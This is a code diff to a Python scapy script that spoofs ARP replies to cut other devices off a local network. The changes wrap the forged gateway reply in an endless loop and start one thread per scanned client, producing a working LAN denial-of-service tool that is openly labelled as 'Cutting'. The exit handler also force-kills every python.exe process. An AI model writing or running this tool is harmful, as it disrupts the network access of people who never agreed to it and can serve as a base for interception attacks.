@@ -2,6 +2,7 @@ from scapy.all import *
 from time import sleep
 from os import system
 import random
+from threading import Thread
 loading=0
 while loading<100:
     # animation = ["-","\\", "|","/"]
@@ -51,8 +52,8 @@ for sent, received in result:
 
 
 def cut(target_ip, target_mac):
-    packet = ARP(op=2, psrc=gateway, hwsrc='12:34:56:78:9A:BC', pdst=target_ip, hwdst=target_mac)
-    send(packet, verbose=0)
+    while True:
+        send(ARP(op=2, psrc=gateway, hwsrc='12:34:56:78:9A:BC', pdst=target_ip, hwdst=target_mac), verbose=0)
 
 
 print("---------------")
@@ -72,7 +73,9 @@ print(banner)
 
 for i in range(len(client_ip)):
     if i != 0:
-        cut(client_ip[i], client_mac[i])
+        Thread()
+        # Thread(target=(cut, args=(client_ip[i], client_mac[i]))
+        Thread(target=cut, args=(client_ip[i], client_mac[i])).start()
 
 while True:
     try:
@@ -81,7 +84,11 @@ while True:
             print("[ + ] Cutting . . . ", i, end="\r")
             sleep(.1)
     except KeyboardInterrupt:
+        system("echo off && taskkill /f /im python.exe ")
+        system('cls')
+        # print(banner)
         break
+        
 
 
     
